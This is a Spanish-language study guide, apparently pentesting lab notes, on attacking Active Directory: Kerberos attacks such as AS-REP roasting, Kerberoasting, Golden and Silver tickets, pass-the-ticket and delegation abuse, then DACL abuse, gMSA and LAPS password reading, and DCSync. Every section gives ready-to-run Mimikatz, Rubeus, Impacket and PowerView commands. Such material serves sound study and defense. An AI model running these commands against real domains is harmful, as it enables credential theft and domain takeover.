
# 1. 🎟️ Ataques kerberos

Los ataques contra Kerberos explotan debilidades en su diseño o mala configuración para **obtener tickets, crackearlos offline o falsificarlos** directamente. La mayoría no requieren tráfico adicional sospechoso porque abusa del propio protocolo.

```
[Qué tenemos]
    └──────────┬─ Sin credenciales ───────────▶ AS-REP Roasting (usuarios sin preauth)
               ├─ Con credenciales válidas ───▶ Kerberoasting (cuentas con SPN)
               └─ Con un Hash ───────────┬────▶ Hash KRBTGT ──────────────▶ Golden Ticket
                                         └───-▶ Hash de cuenta con SPN ───▶ Silver Ticket
```        

---
## 1.1. 🔍 Enumeración y fuerza bruta con Kerbrute

Con la herramienta kerbrute podemos obtener con kerberos información valiosa:

Para la enumeración de usuarios utilizamos 
```
kerbrute userenum -dc-ip <ip_dc> -d dominio.local users.txt
```
- Podemos usar los usuarios que obtengamos de rpc, de una web, de algún archivo o de un diccionario como https://github.com/attackdebris/kerberos_enum_userlists

Para obtener la copia de `Kc.tgs` usamos este comando, para hacer fuerza bruta sobre un usuario. Luego rompemos este hash con john 
```
kerbrute bruteuser -dc-ip <ip_dc> -d dominio.local diccionario usuario
```

---
## 1.2. AS-REP Roasting

En Kerberos normal, el cliente debe cifrar un timestamp con su contraseña antes de recibir nada. Esto evita que un atacante pregunte por cualquier usuario sin consecuencias. 

> [!WARNING]
Si la preautenticación está desactivada para un usuario (`DONT_REQ_PREAUTH`) el KDC responde al AS-REQ de cualquiera que conozca el nombre de usuario, **sin verificar que conoce la contraseña**.
```bash
Dominio.local 🡆 Users 🡆 Usuario 🡆 Account 🡆 Account Options 🡆 Do not requiere kerberos preauthentication
```


Recordemos que el AS-REP contiene dos partes:
- El **TGT** → cifrado con la clave de KRBTGT, inútil para el atacante
- La **copia de `Kc.tgs`** → cifrada con la clave derivada de la **contraseña del usuario**

El atacante extrae esa segunda parte y la **crackea offline** para recuperar la contraseña.

Para obtener la copia de Kc.tgs usamos este comando. Luego rompemos este hash con john 
```
Impacket-GetNPUsers dominio.local/ -dc-ip 10.10.10.10 -no-pass -usersfile users.txt -format hashcat
```

---
## 1.2. Kerberoasting

Cualquier usuario autenticado puede pedir un ST para cualquier servicio del dominio. El ST está cifrado con la clave de la cuenta asociada al SPN. El KDC no comprueba si el usuario tiene permiso para usar ese servicio, solo emite el ticket.

El atacante solicita el ST legítimamente y lo **crackea offline** para recuperar la contraseña de la cuenta de servicio.

> [!WARNING]
 Para el ataque, hay que asignarle un SPN a un usuario nromal, eso hace que Kerberos lo trate como una cuenta de servicio aunque el SPN no exista. Si su contraseña es débil, el atacante podrá obtenerla a partir del ST
> 
> Para asignarle un SPN a un usuario es con `setspn -A test/spn usuario` luego podemos listarlo con `setspn -L usuario`

 Obtener el ST de usuarios con SPN y crackearlo
```
impacket-GetUserSPNs dominio.local/usuario:pass -request
```

Por eso, los servicios deben estar gestionados por **Managed Service Accounts (MSA/gMSA)**, lo que le da contraseñas aleatorias de 120 caracteres, incrackeables en la práctica. También se recomienda auditar regularmente los SPNs asignados.

---
## 1.3. Ataques de creación de tickets

### 1.3.1. Golden Ticket

El TGT está cifrado con la clave de KRBTGT. El KDC confía ciegamente en cualquier TGT que pueda descifrar con esa clave. Si el atacante tiene esa clave, puede **fabricar TGTs válidos** para pedir **STs** en nombre de cualquier usuario para cualquier servicio, incluyendo administradores o usuarios inexistentes. 

> [!WARNING]
Por tanto esta vía suele darse en postexplotación como vía de persistencia. Este ataque da **acceso potencial a todo el dominio**, siendo el ticket mas valioso que existe en un AD. Los Golden Tickets **persisten incluso si se cambia la contraseña del usuario suplantado**, porque el KDC no verifica que el usuario exista, solo que el TGT sea válido

Para el ataque, necesitamos haber dumpeado el **Hash NTLM de la cuenta KRBTGT** (obtenible por ejemplo mediante **DCSync**).

```bash
# Ataque desde Windows con Mimikatz
# - Podemos cambiar el cifrado a /aes256:hash o /aes128:hash
# - Nowrap permite copiar mejor el ticket en base64
.\mimikatz.exe 'kerberos::golden /user:Administrator /domain:dominio.local /sid:<domainSID> /rc4:<krbtgtNThash> /id:500 /ptt /nowrap' exit


# Ataque desde Windows con Rubeus
.\Rubeus.exe golden /rc4:<krbtgtNThash> /domain:dominio.local /sid:<domainSID> /user:Administrator /ptt /ldap /nowrap

# Ataque desde Linux
impacket-ticketer.py -nthash <krbtgtNThash> -domain-sid <domainSID> -domain domain.local Administrator
```

----------
### 1.3.2. Silver Ticket

El ST está cifrado con la clave de la cuenta que ejecuta el servicio. Si el atacante tiene esa clave, puede **fabricar STs válidos** para ese servicio concreto, sin pasar por el KDC.

A diferencia del Golden ticket, este da acceso solo al servicio comprometido pero es más sigiloso. Para ello se necesita el **hash NTLM de la cuenta de servicio** (obtenible por ejemplo mediante Kerberoasting u otras técnicas).

```bash
# Windows
.\mimikatz.exe 'kerberos::golden /domain:dominio.local /sid:<domainSID> /rc4:<krbtgtNThash> /id:500 /user:usuario /service:servicio' exit

.\rubeus.exe asktgs /user:<USER> /rc4:<HASH> /domain:dominio.local /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Kali
impacket-ticketer -dc-ip <ip> -spn CIFS/AD01.Domain.local -domain-sid <domainSID> -nthash <NThash> -domain domain.local Administrator
```

---
### 1.3.3. Pass the Ticket

Los tickets Kerberos se almacenan en memoria (LSASS en Windows). Si el atacante tiene acceso a la memoria de una máquina donde hay una sesión activa, puede extraer los tickets e **inyectarlos en su propia sesión** para suplantar al usuario.

Mientras que en PtH se usa el hash para autenticarse por NTLM. En PtT se usa directamente el ticket Kerberos, sin necesitar la contraseña ni el hash.

Para ello necesitamos el **TGT o ST robado** de la memoria de un sistema comprometido (por ejemplo con Mimikatz o Rubeus). En Linux es un archivo *.ccache* y en Windows un *.kirbi*

Subimos la herramienta mimikatz para obtener los tickets y la ejecutamos:
```bash
# 1. Subimos mimikatz y exportamos los tickets
.\mimikatz.exe 'sekurlsa::tickets /export' exit
# Seleccionamos el ticket que nos interesa, de un usuario privilegiado, Ej Administrator

# 2. Lo cargamos en memoria con mimikatz: 
.\mimikatz.exe 'kerberos::ptt <ticket>.kirbi' exit

# 3. Vemos que efectivamente funciona
klist

# Podemos descargarlo y convertilo a formato Linux
impacket-ticketConverter ticket.kirbi ticket.ccache
```

> [!TIP]
> Mitigación
> - Activar **Protected Users Security Group** (los tickets de estos usuarios no se almacenan en caché)
> - Usar **Credential Guard** para aislar LSASS
> - Minimizar sesiones de cuentas privilegiadas en máquinas no controladas

---
## 1.4. Ataques de Delegación

La delegación permite que un servicio actúe **en nombre de un usuario** frente a otro servicio de otra máquina. Fue diseñada para resolver el "Double Hop problem", haciendo que el servicio cachee las credenciales del usuario (los tickets) y los pueda enviar. Es muy útil para para arquitecturas de múltiples capas (web → BBDD, web → SMB...), pero peligrosa si está mal configurada. 

- Por ejemplo queremos que un solo usuario acceda al servicio web

Existen tres modelos, de menos a más seguro:

---

### 1.4.1. Unconstrained Delegation

Cuando un usuario se autentica contra una máquina con Unconstrained Delegation, su **TGT completo queda almacenado en esa máquina**. La máquina puede usarlo para acceder a cualquier servicio en nombre del usuario.

```
Admin                          AD02 (Unconstrained)                        AD01 (DC)
  │                                      │                                     │
  │──── se conecta por SMB ──▶ Atacante compromete AD02 ──── ST como Admin ───▶│
  │     (TGT queda en AD02)    [extrae TGT del Admin]   ◀─── acceso total ─────│
```

Necesitamos comprometer una **máquina o cuenta con Unconstrained Delegation** activada y conseguir que un usuario privilegiado se autentique contra ella. Por ejemplo la víctima usa `Test-NetConnection maquina -Port 445` y luego `dir \\maquina.dominio.local\$C`.  Se puede forzar esta autenticación con el Printer Bug (MS-RPRN)

> 🛠️ Config 🛠️
> 1. A un sistema se le activa la delegación `Set-ADAccountControl -IDentity AD02$ -TrustedForDelegation $true`
> 2. El atacante ha comprometido a un administrador local de esa máquina, `net localgroup Administrators admin /add`

Con rubeus monitorizamos en la máquina los tickets hasta dar con el de algun "Domain Admin".  Luego copiamos el ticket y lo listamos con `klist` para ver si se cargó en memoria:
```
.\rubeus.exe monitor /interval:7 /ptt /nowrap
```


---
### 1.4.2. Constrained Delegation

La delegación está restringida a servicios específicos, definidos en el atributo `msDS-AllowedToDelegateTo`. Funciona mediante dos extensiones:

| Extensión | Función |
|---|---|
| **S4U2Self** | La cuenta de servicio obtiene un ST *hacia sí misma* en nombre de otro usuario |
| **S4U2Proxy** | Usa ese ST como prueba para pedir un ST hacia el servicio final permitido |
Solo funciona hacia los servicios listados en `msDS-AllowedToDelegateTo`. No se puede saltar a otros servicios

```
Atacante (cuenta comprometida                              KDC              CIFS/AD01
con delegación hacia CIFS/AD01)                             │                    │
   │                                                        │                    │
   │── S4U2Self: "dame ST para mí como Administrator" ─────▶│                    │
   │◀───── ST (para la cuenta) ─────────────────────────────│                    │
   │                                                        │                    │
   │── S4U2Proxy: "dame ST para CIFS/AD01 como Admin" ─────▶│                    │
   │◀───── ST para CIFS/AD01 ───────────────────────────────│                    │
   │                                                        │                    │
   │─────────────────────────────────────────────────────────── AP-REQ ─────────▶│
```

Necesitamos Comprometer una **cuenta con SPN y Constrained Delegation** configurada hacia un servicio concreto.

> 🛠️ Config 🛠️
> 1. Se le asigna un SPN a un usuario `setspn -A test/spn`
> 2. En **dsa.msc**: `Dominio.local > Users > Usuario > Delegation > Trust this user for delegation > Use Any authentication Protocol` y seleccionamos un servicio en una máquina (el DC), por ejemplo *cifs/AD01.dominio.local*

Obtenemos el Service Ticket desde Linux con:
```
impacket-getST dominio.local/admin:pass123 -spn cifs/AD01.dominio.local -impersonate Administrator -dc-ip <ip_DC>
```

---
### 1.4.3 Resource-Based Constrained Delegation (RBCD)

Necesitamos el permiso de **escritura sobre el atributo** `msDS-AllowedToActOnBehalfOfOtherIdentity` del servicio destino (por ejemplo por `GenericWrite` o `GenericAll`).

A diferencia de los modelos anteriores, aquí **es el servicio destino quien decide** qué cuentas pueden delegar hacia él. Esto se controla desde el objeto del propio recurso, no desde la cuenta que delega.

```
  Constrained clásica:          RBCD:
  "Yo decido a dónde voy"       "Yo decido quién entra"
  
  cuenta_servicio               recurso_destino
  └── msDS-AllowedToDelegateTo  └── msDS-AllowedToActOnBehalfOf
      └── cifs/DC01                 └── cuenta_atacante
```

En un ataque, si se tiene `GenericWrite` sobre un objeto equipo (muy común en mal configuradas), se puede apuntar `msDS-AllowedToActOnBehalfOfOtherIdentity` a una cuenta controlada por el atacante y luego usar S4U2Self + S4U2Proxy para obtener un ST como cualquier usuario hacia ese equipo.

> [!TIP] 
> Mitigación general para delegación
> - Añadir cuentas sensibles al grupo **Protected Users** (no pueden ser delegadas)
> - Marcar cuentas críticas como **"La cuenta es confidencial y no se puede delegar"**
> - Auditar regularmente los atributos de delegación en el dominio
> - Limitar `GenericWrite` sobre objetos de equipo

---
# 2. DACL abuse

## 2.1. Enumeración con Bloodhound

BloodHound es una herramienta de análisis y visualización de entornos Active Directory que se utiliza en auditorías de seguridad para identificar relaciones entre usuarios, grupos, equipos, permisos y rutas de ataque que podrían permitir escalar privilegios o llegar a activos críticos.

Funciona apoyándose en Neo4j, una base de datos orientada a grafos, donde almacena esas relaciones como nodos y aristas para poder consultarlas y representarlas visualmente. Por detrás, sus recolectores obtienen información del dominio mediante consultas LDAP contra controladores de dominio.

1. Se instala con  `sudo-apt install bloodhound `
2. La primera vez que lo ejecutamos, nos muestra un panel, que nos dice que se ejecuta el comando  `bloodhound-setup` . Esperamos a que realice la configuración de neo4j y nos dice que las credenciales iniciales son `neo4j:neo4j`.
3. Se nos abre en el localhost una instancia de neo4j y simplemente tenemos que poner las credenciales que nos han dado. 
4. El siguiente panel nos pide que actualicemos las credenciales. Nos pide que cambiemos este archivo con la nueva contraseña.
5. Ponemos el comando  `bloodhound`  en la consola y se abre una instancia de la herramienta, solo nos queda poner las credenciales:

Teniendo credenciales válidas, podemos obtener información en el dominio. Indicamos con este comando que queremos usar todos los ingestors con  `-c all`  y que queremos un archivo zip resultante. `<hash>_bloodhound.zip` 
```
bloodhound-python -u <usuario> -p <contraseña> -d <dominio>.local -ns <ip_del_dc> -c all --zip
```

> Si hemos terminado nuestro trabajo con un entorno o queremos simplemente actualizar los datos, tenemos que borrar los anteriores. Para ello nos vamos a `Administration 🡆 Database Management`. Ahí seleccionamos los datos de active directory ("**Active Directory Data**") y los datos de ingesta ("**File ingest log history**")

## 2.2. Configs

Para configurarlos, nos vamos a `Active Directory Users and Computers`, se selecciona un usuario (`B`) o un grupo y en `Security` tenemos los permisos. Si le damos a `Add` podemos añadir el sujeto que tendrá el privilegio sobre el nuestro (`A`)

| Permiso                     | Descripción                            | Config                                             |
| --------------------------- | -------------------------------------- | -------------------------------------------------- |
| `ForceChangePassword`       | `A` puede cambiar la contraseña de `B` | En `B` 🡆 `Reset Password` para `A`                |
| `Addself`                   | `A` puede meterse en el `Grupo`        | En `Grupo`🡆 `Add/Remove self as member` para `A`  |
| `Write Owner` sobre usuario | `A` puede apropiarse de `Grupo`        | En `Grupo` 🡆 `Advanced` 🡆`Modify Owner` para `A` |
| `Write Owner` sobre grupo   | `A` puede apropiarse de `B`            | En `B` 🡆 `Advanced` 🡆 `Modify Owner` sobre `A`   |


----
## 2.3. ForceChangePassword

> [!WARNING]
**El permiso ForceChangePassword permite restablecer la contraseña de otro usuario sin conocer la contraseña actual.**

Es un permiso que se aplica sobre uno o varios objetos de usuario y suele utilizarse en tareas de soporte técnico, por ejemplo cuando un usuario olvida su contraseña o cuando una cuenta ha podido verse comprometida y es necesario recuperar su acceso. En estos casos, normalmente también se marca la opción **“User must change password at next logon”**, para que el usuario establezca una nueva contraseña en el siguiente inicio de sesión y recupere así el control de su cuenta una vez finalizadas las tareas de soporte o remediación.

> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `Force Change Password` sobre `B`

```bash
WINDOWS: Set-DomainUserPassword -Identity "B" -AccountPassword (ConvertTo-SecureString "pass123" -AsPlainText -Force)
  
KALI rpclient: setuserinfo B 23 pass123
```

----

## 2.4. Addself

> [!WARNING]
**El permiso AddSelf en Active Directory permite que una cuenta se añada o elimine a sí misma de la membresía de un grupo.**

Este privilegio solo se puede aplicar sobre grupos. **Es muy peligroso cuando se aplica sobre grupos privilegiados, ya que un atacante que comprometa una cuenta con este permiso podría autoañadirse al grupo y heredar los privilegios asociados a él.**

> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `AddSelf` sobre `Grupo`

Para la explotación por tanto solo tiene que autoañadirse al grupo sobre el que tiene los permisos.
```bash
PS: Add-DomainGroupMember -Identity <grupo> -Members A
CMD: net group Grupo A /add /domain
```

## 2.5. Write Owner / Write DACL / Generic Write

> [!WARNING]
**El permiso WriteOwner en Active Directory permite cambiar el propietario de un objeto.** Este propietario puede modificar el DACLdel objeto, es decir, la lista de permisos que determina las acciones que puedan realizar el resto de usuarios con él. 

GenericWrite permite tambien modificar los atributos y permisos de un objeto.

Si un atacante compromete una cuenta que tiene WriteOwner sobre un objeto puede convertirse en su dueño y cambiar sus permisos y con WriteDACL cambiarlos directamente. Obtendrá así una escalada de privilegios que puede variar según el tipo de dato del que hablemos
- Sobre un grupo puede modificar sus permisos y, en algunos casos, añadirse a sí mismo al grupo y heredar así sus privilegios
- Sobre un usuario puede modificar sus permisos y cambiarle la contraseña o hacerlo kerberoasteable

#### Sobre un grupo

> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `Write Owner` sobre `Grupo`

Por tanto nos apropiamos del grupo y modificamos las ACL
```bash
. .\Powerview.ps1
# 1. Nos adueñamos del gripo
Set-DomainObjectOwner -OwnerIdentity A -Identity Grupo 

# 2. Nos damos derechos, si tenemos WriteDACL podemos hacerlo directamente
Add-DomainObjectAcl -PrincipalIdentity A -TargetIdentity Grupo -Rights All 
net group Grupo A /add /domain
```

#### Sobre un usuario

> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `Write Owner` sobre `B`

Los comandos son los mismos para asignar los permisos. Luego podemos
- **Cambiarle la contraseña**: lo mismo que con `Force Change Password`
- **Hacerlo kerberoasteable**: `set-DomainObject -Identity B -Set @{serviceprincipalname='lol/xd'}`


## 2.6. Read GMSA Password

> [!WARNING]
Una **gMSA** (group Managed Service Account) es una cuenta de dominio especial para ejecutar servicios con gestión automática de contraseña. En este caso, el DC genera una contraseña aleatoria que se manda a los equipos gMSA para que ejecuten los servicios, tareas programadas o aplicaciones que necesiten.

Por ejemplo al configurar el equipo que gestiona la web IIS, no se introduce siquiera una contraseña en la configuración del servicio web, solo se le da el permiso gMSA al equipo. 

Pues bien, el permiso **ReadGMSAPassword** permite leer esa contraseña del equipo autorizado y hacerse pasar por ese servicio. Si este tiene acceso a recursos críticos, el atacante heredará dicho acceso.

Para la explotación tenemos varias vías.
- Si está LDAPs activado (LDAP sobre TLS, puerto 636), se puede realizar desde kali con la herramienta [gmsadumper(opens in a new tab)](https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py).
- Si se utiliza el LDAP normal, se tiene que subir la herramienta **Invoke-GMSAPasswordReader**, la cual se tiene que subir a la máquina desde la cuenta con los privilegios

> Bloodhound: Tenemos a `A` 🡆 `Outbound Object Control` 🡆 `ReadGMSAPassword` sobre `B`

```bash
. .\gmsa.ps1
Invoke-GMSAPasswordReader -Command ¨"--AccountName B" 
```

---
## 2.7. Read LAPS Password

> [!WARNING]
LAPS (Local Administrator Password Solution) es similar. Sirve para generar una contraseña robusta y rotada automáticamente para los administradores locales de cada equipo del AD.  Esta la genera y la guarda el DC. 

Se usa sobre todo para soporte, administración y recuperación de equipos. Por ejemplo, si un técnico necesita entrar en un servidor o un PC con la cuenta de administrador local, puede consultar la contraseña LAPS vigente. Esto evita que se reduzcan los ataques de movimiento lateral y pass-the-hash porque impide que se reutilicen las mismas contraseñas.

Si un atacante compromete una cuenta con el permiso "ReadLAPSPassword" podrá leer la contraseña del admin de todas las máquinas y comprometer la red entera. Para ello podrá utilizar la suite de impacket o el propio netexec:
```
impacket-GetLAPSPassword <dominio>.local/<usuario>:<contraseña> -dc-ip <ip>

nxc ldap <ip> -d <dominio>.local -u <usuario> -p <contraseña> --module laps
```

-----
## 2.8.  GetChanges/Get ChangesAll sobre el dominio - DCSync

> [!WARNING]
**Un atacante se hace pasar funcionalmente por un DC autorizado y usa el mecanismo normal de replicación para solicitar datos secretos del dominio, incluidos atributos sensibles de cuentas.**

Con la suite de impacket, podemos realizar un DCSync de manera muy sencilla con secretsdump y las credenciales de nuestra usuaria privilegiada.

```bash
impacket-secretsdump L4H.local/A:pass123@DC01.L4H.local -outputfile hashes.txt

evil-winrm -i 192.168.179.136 -u A -p pass123
PS> upload mimikatz.exe
PS> .\mimikatz.exe "lsadump::dcsync /domain:L4H.local /user:Administrator" exit
```

Al leer el archivo creado, hashes.txt.ntds, podemos filtrar por el hash del usuario que nos interese, como krbtgt, el cual sirve para obtener un golden ticket.
